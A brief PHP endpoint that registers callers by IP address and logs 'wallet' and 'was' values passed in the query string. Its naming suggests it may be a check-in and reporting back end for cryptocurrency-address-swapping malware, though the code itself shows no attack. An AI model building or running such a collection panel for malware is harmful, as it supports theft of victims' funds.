<?php
	require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	
	if(isset($_GET['new'])){
if(get_client($_SERVER["REMOTE_ADDR"]) == null)
	add_client(
		$_SERVER["REMOTE_ADDR"]
	);
}

if(isset($_GET['log'])){
if(get_log($_GET['was']) == null){
add_log(
$_GET['wallet'],
$_GET['was'],
$_SERVER["REMOTE_ADDR"]
);
}
}
	
?>